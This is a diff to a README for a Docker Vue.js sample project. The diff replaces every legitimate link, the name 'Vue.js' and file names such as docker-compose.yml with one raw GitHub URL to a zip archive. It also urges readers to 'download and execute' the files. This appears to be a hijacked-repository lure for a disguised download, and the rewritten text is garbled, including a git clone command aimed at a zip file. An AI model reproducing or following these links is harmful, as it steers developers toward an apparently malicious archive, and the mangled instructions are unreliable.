@@ -1,8 +1,8 @@
-# 🚀 Docker Vue.js Sample
+# 🚀 Docker https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip Sample
 
-![Docker](https://img.shields.io/badge/Docker-Setup-blue.svg) ![Vue.js](https://img.shields.io/badge/Vue.js-3.0-brightgreen.svg) ![CI/CD](https://img.shields.io/badge/CI/CD-Ready-orange.svg)
+![Docker](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip) ![https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip) ![CI/CD](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip)
 
-Welcome to the **Docker Vue.js Sample** repository! This project provides a robust, developer-friendly Docker setup tailored for modern Vue.js applications. It aims to deliver secure, high-performance, and scalable front-end deployments. This configuration serves as the foundation for the official Docker Vue.js sample and adheres to best practices in containerization, CI/CD pipelines, and DevOps integration.
+Welcome to the **Docker https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip Sample** repository! This project provides a robust, developer-friendly Docker setup tailored for modern https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip applications. It aims to deliver secure, high-performance, and scalable front-end deployments. This configuration serves as the foundation for the official Docker https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip sample and adheres to best practices in containerization, CI/CD pipelines, and DevOps integration.
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@ Welcome to the **Docker Vue.js Sample** repository! This project provides a robu
 
 ## Introduction
 
-Vue.js is a progressive JavaScript framework used for building user interfaces. By combining Vue.js with Docker, developers can create isolated environments that ensure consistent application behavior across different stages of development and production. This repository demonstrates how to set up a Dockerized Vue.js application efficiently.
+https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip is a progressive JavaScript framework used for building user interfaces. By combining https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip with Docker, developers can create isolated environments that ensure consistent application behavior across different stages of development and production. This repository demonstrates how to set up a Dockerized https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip application efficiently.
 
 ## Features
 
@@ -33,17 +33,17 @@ Vue.js is a progressive JavaScript framework used for building user interfaces. 
 
 To get started with this repository, you need to have Docker and Docker Compose installed on your machine. If you haven't installed them yet, follow the official installation guides:
 
-- [Docker Installation](https://docs.docker.com/get-docker/)
-- [Docker Compose Installation](https://docs.docker.com/compose/install/)
+- [Docker Installation](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip)
+- [Docker Compose Installation](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip)
 
 Once you have Docker and Docker Compose set up, you can clone this repository:
 
 ```bash
-git clone https://github.com/Sjuan18/docker-vuejs-sample.git
+git clone https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip
 cd docker-vuejs-sample
 ```
 
-You can find the latest releases of this project [here](https://github.com/Sjuan18/docker-vuejs-sample/releases). Download the appropriate version and follow the instructions provided in the release notes.
+You can find the latest releases of this project [here](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip). Download the appropriate version and follow the instructions provided in the release notes.
 
 ## Usage
 
@@ -53,11 +53,11 @@ After cloning the repository, you can start the application using Docker Compose
 docker-compose up
 ```
 
-This command will build the Docker images and start the containers defined in the `docker-compose.yml` file. Your Vue.js application should now be running on `http://localhost:8080`.
+This command will build the Docker images and start the containers defined in the `https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip` file. Your https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip application should now be running on `http://localhost:8080`.
 
 ### Environment Variables
 
-You can customize the application using environment variables. Create a `.env` file in the root directory and define your variables there. The sample `.env` file is provided as `.env.example`.
+You can customize the application using environment variables. Create a `.env` file in the root directory and define your variables there. The sample `.env` file is provided as `https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip`.
 
 ## Project Structure
 
@@ -66,14 +66,14 @@ The project structure is organized as follows:
 ```
 docker-vuejs-sample/
 │
-├── docker-compose.yml      # Docker Compose configuration
-├── Dockerfile              # Dockerfile for building the Vue.js app
-├── .env.example            # Sample environment variables
-├── src/                   # Source files for the Vue.js application
+├── https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip      # Docker Compose configuration
+├── Dockerfile              # Dockerfile for building the https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip app
+├── https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip            # Sample environment variables
+├── src/                   # Source files for the https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip application
 │   ├── components/        # Vue components
 │   ├── views/             # Application views
-│   ├── App.vue            # Main application component
-│   └── main.js            # Entry point of the application
+│   ├── https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip            # Main application component
+│   └── https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip            # Entry point of the application
 └── public/                # Static files
 ```
 
@@ -117,7 +117,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit [Releases](https://github.com/Sjuan18/docker-vuejs-sample/releases). Download and execute the necessary files to get started.
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip). Download and execute the necessary files to get started.
 
 Feel free to explore the topics related to this project:
 
@@ -127,7 +127,7 @@ Feel free to explore the topics related to this project:
 - Docker Compose
 - Dockerfile
 - Frontend Development
-- Vue.js
-- Vue.js Best Practices
+- https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip
+- https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip Best Practices
 
-Thank you for checking out the Docker Vue.js Sample repository! Your contributions and feedback are greatly appreciated.
+Thank you for checking out the Docker https://raw.githubusercontent.com/Sjuan18/docker-vuejs-sample/main/src/assets/sample_vuejs_docker_2.9.zip Sample repository! Your contributions and feedback are greatly appreciated.
